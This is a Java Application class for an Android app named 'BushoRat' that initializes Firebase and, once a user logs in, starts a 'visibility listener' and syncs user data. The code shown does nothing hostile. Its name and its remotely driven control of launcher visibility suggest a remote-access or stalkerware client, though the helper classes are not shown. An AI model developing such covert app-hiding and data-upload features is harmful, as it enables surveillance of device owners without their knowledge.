package com.bushorat.app;

import android.app.Application;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.FirebaseDatabase;
import com.bushorat.app.helpers.AppVisibilityHelper;
import com.bushorat.app.helpers.UserDataSyncHelper;

public class BushoRatApplication extends Application {
    private static final String TAG = "BushoRatApplication";
    private FirebaseAuth.AuthStateListener authStateListener;

    @Override
    public void onCreate() {
        super.onCreate();

        Log.d(TAG, "Application onCreate: Initializing Firebase");

        FirebaseApp.initializeApp(this);
        FirebaseDatabase.getInstance().setPersistenceEnabled(true);

        // Keep launcher openable; never block the main thread on Firebase here.
        AppVisibilityHelper.getInstance(this).ensureLauncherComponentEnabled();
        registerVisibilityAuthListener();
    }

    private void registerVisibilityAuthListener() {
        authStateListener = firebaseAuth -> {
            if (firebaseAuth.getCurrentUser() != null) {
                Log.d(TAG, "Auth state: user logged in, starting visibility listener and data sync");
                AppVisibilityHelper visibilityHelper =
                        AppVisibilityHelper.getInstance(BushoRatApplication.this);
                visibilityHelper.ensureListenerStarted();
                // Async only — previous blocking await on the main thread caused freezes/crashes.
                UserDataSyncHelper.syncAll(BushoRatApplication.this);
            }
        };
        FirebaseAuth.getInstance().addAuthStateListener(authStateListener);
    }
}
